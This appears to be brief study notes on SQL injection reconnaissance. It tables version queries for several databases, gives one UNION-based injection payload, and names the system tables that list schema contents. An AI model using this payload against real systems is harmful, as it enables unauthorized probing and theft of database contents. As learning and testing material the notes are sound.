# Examining the database in SQL injection attacks

## Queries that determine db version 

|Database | Query|
|---------|-----|
|Microsoft, MySQL | `SELECT @@version`
|Oracle| `SELECT banner FROM v$version`|
|PostgreSQL | `SELECT version()`|

The version can be identified using a `UNION` attack.
```text
' UNION SELECT @@version
```

## Lisiting contents of the database
| | Database tables | Table Columns|
|-|-----------------|--------------|
|Non Oracle Database | `information_schema.tables` | ``information_schema.columns`|
|Oracle database | all_tables | all_tab_columns |

